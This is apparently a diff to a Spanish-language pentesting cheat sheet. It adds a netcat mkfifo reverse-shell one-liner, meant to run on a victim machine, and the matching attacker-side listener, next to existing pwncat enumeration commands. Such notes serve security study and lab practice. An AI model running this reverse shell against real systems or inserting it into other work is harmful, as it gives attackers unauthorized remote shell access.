@@ -134,6 +134,13 @@ Escucha por Netcat en espera de la **ReverShell**:
 ```
 
 ```bash 
+❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc <IP> 443 >/tmp/f   # Podemos usar este comando para hacer una Revershell desde una bash en la maquina victima  
+
+# Nos debemos de poner en escucha antes de esta manera
+❯ nc -nlvp 443                   # Escucha en la maquina de atacante
+```
+
+```bash 
 ❯ pwncat-cs -lp 443                         # Podemos usar esta herramienta llamada 'Pwncat'
 	❯ run enumerate                        # Enumera todo el sistema 
 	❯ run enumerate.user                   # Enumeras los usuarios
